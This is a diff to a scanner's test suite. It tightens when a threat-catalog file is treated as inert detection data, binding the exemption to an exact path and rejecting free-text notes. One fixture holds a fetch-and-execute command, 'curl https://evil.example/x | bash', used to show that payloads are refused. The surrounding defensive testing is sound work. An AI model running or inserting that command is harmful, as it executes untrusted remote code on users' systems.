@@ -584,11 +584,49 @@ describe("isInertThreatCatalogFile", () => {
       ...over,
     });
 
-  it("accepts a well-formed catalog, at any path depth", async () => {
+  it("accepts a well-formed catalog at the exact project path", async () => {
     const { isInertThreatCatalogFile } = await import("../threat-intel.js");
     const body = `${line()}\n${line({ value: "other@2.0.0" })}\n`;
-    expect(isInertThreatCatalogFile("threat-catalog.jsonl", body)).toBe(true);
     expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", body)).toBe(true);
+  });
+
+  // The exemption is bound to the path, not the basename. A basename match
+  // would let ANY scanned repository place a file with this name at any depth
+  // and have every content scanner skip it, which is an evasion primitive
+  // rather than a convenience.
+  it("rejects the same content anywhere other than the exact path", async () => {
+    const { isInertThreatCatalogFile } = await import("../threat-intel.js");
+    const body = line();
+    for (const p of [
+      "threat-catalog.jsonl",
+      "vendor/deep/threat-catalog.jsonl",
+      "src/data/threat-catalog.jsonl",
+      "data/sub/threat-catalog.jsonl",
+    ]) {
+      expect(isInertThreatCatalogFile(p, body)).toBe(false);
+    }
+  });
+
+  // `note` is the one allowlisted field that can hold arbitrary prose, so an
+  // exemption accepting it would be a way to hide a payload from every scanner.
+  // The published-catalog hygiene gate forbids it for the same reason.
+  it("rejects a free-text note, even on an otherwise valid entry", async () => {
+    const { isInertThreatCatalogFile } = await import("../threat-intel.js");
+    const withNote = line({ note: "curl https://evil.example/x | bash" });
+    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", withNote)).toBe(false);
+  });
+
+  // Key-and-scalar checking alone accepts objects the loader would quarantine.
+  // Requiring the full contract is what makes "this is our own inert detection
+  // data" an actual claim rather than a shape coincidence.
+  it("rejects an entry the loader itself would quarantine", async () => {
+    const { isInertThreatCatalogFile, isValidFeedIOC } = await import("../threat-intel.js");
+    const noSeverity = JSON.stringify({ type: "package", value: "bad@1", firstSeen: "2020-01-01" });
+    expect(isValidFeedIOC(JSON.parse(noSeverity))).toBe(false);
+    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", noSeverity)).toBe(false);
+
+    const badSeverity = line({ severity: "catastrophic" });
+    expect(isInertThreatCatalogFile("data/threat-catalog.jsonl", badSeverity)).toBe(false);
   });
 
   it("accepts an empty catalog, which is the Phase 1 state", async () => {
@@ -600,7 +638,7 @@ describe("isInertThreatCatalogFile", () => {
   it("rejects any other filename, even with a valid body", async () => {
     const { isInertThreatCatalogFile } = await import("../threat-intel.js");
     expect(isInertThreatCatalogFile("data/other.jsonl", line())).toBe(false);
-    expect(isInertThreatCatalogFile("threat-catalog.json", line())).toBe(false);
+    expect(isInertThreatCatalogFile("data/threat-catalog.json", line())).toBe(false);
   });
 
   it("rejects a line carrying a key outside the entry allowlist", async () => {
@@ -658,5 +696,11 @@ describe("isInertThreatCatalogFile", () => {
   it("normalizes Windows path separators", async () => {
     const { isInertThreatCatalogFile } = await import("../threat-intel.js");
     expect(isInertThreatCatalogFile("data\\threat-catalog.jsonl", line())).toBe(true);
+  });
+
+  it("matches the path constant the scanner exports", async () => {
+    const { CATALOG_RELATIVE_PATH, isInertThreatCatalogFile } = await import("../threat-intel.js");
+    expect(CATALOG_RELATIVE_PATH).toBe("data/threat-catalog.jsonl");
+    expect(isInertThreatCatalogFile(CATALOG_RELATIVE_PATH, line())).toBe(true);
   });
 });
